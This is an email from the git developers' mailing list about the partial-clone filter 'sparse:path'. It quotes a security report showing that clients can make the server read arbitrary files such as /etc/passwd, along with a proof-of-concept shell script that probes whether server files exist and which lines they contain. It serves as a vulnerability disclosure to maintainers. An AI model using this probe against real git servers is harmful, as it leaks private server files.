Return-Path: <git-owner@vger.kernel.org>
X-Spam-Checker-Version: SpamAssassin 3.4.1 (2015-04-28) on dcvr.yhbt.net
X-Spam-Level: 
X-Spam-ASN: AS31976 209.132.180.0/23
X-Spam-Status: No, score=-4.1 required=3.0 tests=AWL,BAYES_00,
	HEADER_FROM_DIFFERENT_DOMAINS,MAILING_LIST_MULTI,RCVD_IN_DNSWL_HI
	shortcircuit=no autolearn=ham autolearn_force=no version=3.4.1
Received: from vger.kernel.org (vger.kernel.org [209.132.180.67])
	by dcvr.yhbt.net (Postfix) with ESMTP id 357D01F453
	for <e@80x24.org>; Thu,  8 Nov 2018 18:57:58 +0000 (UTC)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S1726995AbeKIEep (ORCPT <rfc822;e@80x24.org>);
        Thu, 8 Nov 2018 23:34:45 -0500
Received: from siwi.pair.com ([209.68.5.199]:53227 "EHLO siwi.pair.com"
        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
        id S1726751AbeKIEeo (ORCPT <rfc822;git@vger.kernel.org>);
        Thu, 8 Nov 2018 23:34:44 -0500
Received: from siwi.pair.com (localhost [127.0.0.1])
        by siwi.pair.com (Postfix) with ESMTP id B48A83F40D3;
        Thu,  8 Nov 2018 13:57:53 -0500 (EST)
Received: from [IPv6:2001:4898:6808:13e:6c46:be1b:9021:1a0a] (unknown [IPv6:2001:4898:8010:0:557c:be1b:9021:1a0a])
        (using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
        (No client certificate requested)
        by siwi.pair.com (Postfix) with ESMTPSA id 627743F40CB;
        Thu,  8 Nov 2018 13:57:53 -0500 (EST)
Subject: Re: how does "clone --filter=sparse:path" work?
To:     Jeff King <peff@peff.net>, git@vger.kernel.org
Cc:     Jeff Hostetler <jeffhost@microsoft.com>,
        Jonathan Tan <jonathantanmy@google.com>,
        Matthew DeVore <matvore@google.com>
References: <20181108050755.GA32158@sigill.intra.peff.net>
From:   Jeff Hostetler <git@jeffhostetler.com>
Message-ID: <79b06312-75ca-5a50-c337-dc6715305edb@jeffhostetler.com>
Date:   Thu, 8 Nov 2018 13:57:52 -0500
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101
 Thunderbird/60.3.0
MIME-Version: 1.0
In-Reply-To: <20181108050755.GA32158@sigill.intra.peff.net>
Content-Type: text/plain; charset=utf-8; format=flowed
Content-Language: en-US
Content-Transfer-Encoding: 7bit
Sender: git-owner@vger.kernel.org
Precedence: bulk
List-ID: <git.vger.kernel.org>
X-Mailing-List: git@vger.kernel.org



On 11/8/2018 12:07 AM, Jeff King wrote:
> [cc-ing people who worked on or seem interested in partial-clone
> filters]
> 
> I've been exploring the partial-clone options a bit, and took a look at
> the "sparse:path" option. I had some confusion initially, because I
> expected it work something like this:
> 
>    git clone --filter=sparse:path=Documentation .
> 
> But it really doesn't take an in-repo path. You have to specify a path
> to a file that contains a file with .gitignore patterns. Except they're
> actually _inverted_ patterns (i.e., what to include). Which confused me
> again, but I guess makes sense if these are meant to be adapted from
> sparse-checkout files.
> 
> So my first question is: how is this meant to be used?
> 
> I guess the idea is that somebody (the repo admin?) makes a set of
> pre-made profiles, with each profile mentioning some subset of paths.
> And then when you clone, you say, "I want the foo profile". How is that
> profile stored and accessed?

Yes, the basic idea was if you had a large tree and various groups
of users that tended to only need their group's portion of the tree,
then you could (or your repo admin could) create several profiles.
And users could use a profile to request just the subset of trees and
blobs they need.

During a clone/fetch users could ask for the profile by OID or by
<rev>:<path>.  It would be a local/custom detail where the repo admin
collects the various profiles.  (Or at least, that was the thought.)
Likewise, a user could create their own profile(s) by committing a
sparse-checkout file spec to a personal branch.  Again, a local
convention.


> 
> If it's a blob in the repository, I think you can use something like
> "--filter=sparse:oid=profiles:foo". And then after cloning, you'd
> do "git cat-file blob profiles:foo >.git/sparse-checkout" or similar.
> That seems like something that could be wrapped up in a single clone
> option, but I can't find one; I won't be surprised if it simply hasn't
> happened yet.

Right, TBD.


> 
> But if it's a path, then what? I'd imagine that you'd "somehow" get a
> copy of the sparse profile you want out-of-band. And then you'd say "I
> want to clone with the profile in this file", and then copy it into the
> sparse-checkout file to do the checkout.
> 
> But the sparse-checkout file in the filter is not expanded locally, with
> patterns sent over the wire. The _filename_ is sent over the wire, and
> then upload-pack expands it. So you can't specify an arbitrary set of
> patterns; you have to know about the profile names (how?) on the server.
> That's not very flexible, though I imagine it may make certain things
> easier on the server (e.g., if you pack in such a way to efficiently
> serve only particular profiles).
> 
> But I'm also concerned it's dangerous. We're reading gitignore patterns
> from an arbitrary name on the server's filesystem, with that name coming
> from an untrusted client. So I can do:
> 
>    git clone --filter=sparse:path=/etc/passwd $remote
> 
> and the server will read /etc/passwd. There's probably a lot of mischief
> you can get up to with that. Sadly reading /proc/self/mem doesn't work,
> because the gitignore code fstat()s the file to find out how much to
> read, and the st_size there is 0. But there are probably others
> (/proc/kcore is a fun one, but nobody is running their git server as
> root, right?).
> 
> Below is a proof of concept script that uses this as an oracle to
> explore the filesystem, as well as individual lines of files.
> 
> Should we simply be disallowing sparse:path filters over upload-pack?

The option to allow an absolute path over the wire probably needs more
thought as you suggest.

Having it in the traverse code was useful for local testing in the
client.

But mainly I was thinking of a use case on the client of the form:

     git rev-list
         --objects
         --filter=spec:path=.git/sparse-checkout
         --missing=print
         <commit>

and get a list of the blobs that you don't have and would need before
you could checkout <commit> using the current sparse-checkout 
definition.  You could then have a pre-checkout hook that would bulk
fetch them before starting the actual checkout.  Since that would be
more efficient than demand-loading blobs individually during the
checkout.  There's more work to do in this area, but that was the idea.

But back to your point, yes, I think we should restrict this over the
wire.


Thanks,
Jeff




> 
> -Peff
> 
> -- >8 --
> # Set this to host:repo.git to see a real cross-machine connection (which makes
> # it more obvious which side is reading which files).  For a simulated local
> # one, we'll use --no-local to make sure we really run upload-pack.
> SERVER=server.git
> 
> # Do these steps manually on the remote side if you're trying it cross-server.
> case "$SERVER" in
> *:*)
> 	;;
> *)
> 	# Imagine a server with a repository users can push to, with filters enabled.
> 	git init -q --bare $SERVER
> 	git -C $SERVER config uploadpack.allowfilter true
> 
> 	# Imagine the server has a file outside of the repo we're interested in.
> 	echo foo >/tmp/secret
> 	;;
> esac
> 
> # Some base setup.
> git clone -q $SERVER local
> git -C local commit -q --allow-empty -m 'some base commit'
> git -C local push -q
> 
> # We can find out whether a path exists on the filesystem.
> probe_file () {
> 	# The remote upload-pack will barf if it cannot read the path $1.
> 	rm -rf result
> 	if git clone --bare --no-local --filter=sparse:path=$1 \
> 		$SERVER result >/dev/null 2>&1
> 	then
> 		echo "$1 exists"
> 	else
> 		echo "$1 does not exist"
> 	fi
> }
> probe_file /tmp/missing
> probe_file /tmp/secret
> 
> # We can also check individual lines in a file.
> probe_line () {
> 	# Make a probe that contains the path $2.
> 	(
> 		cd local
> 		echo $2 >$2
> 		git add $2
> 		git commit -m "probe for $2"
> 		git push
> 	) >/dev/null 2>&1
> 
> 	# And then fetch that probe with the filter to see
> 	# if it was included. This needs to be bare so we don't
> 	# do a followup fetch to checkout.
> 	rm -rf result
> 	git clone -q --bare --no-local --filter=sparse:path=$1 \
> 		$SERVER result
> 
> 	# We have all the information we need now, but we have to convince Git
> 	# to tell it to us. There's no way to set fetch_if_missing externally,
> 	# but we can drop the remote, which means that excluded paths
> 	# will result in an error.
> 	git -C result remote rm origin
> 	if git -C result cat-file -t HEAD:$2 >/dev/null 2>&1
> 	then
> 		echo "$1 contains line $2"
> 	else
> 		echo "$1 does not contain line $2"
> 	fi
> }
> probe_line /tmp/secret foo
> probe_line /tmp/secret bar
> 
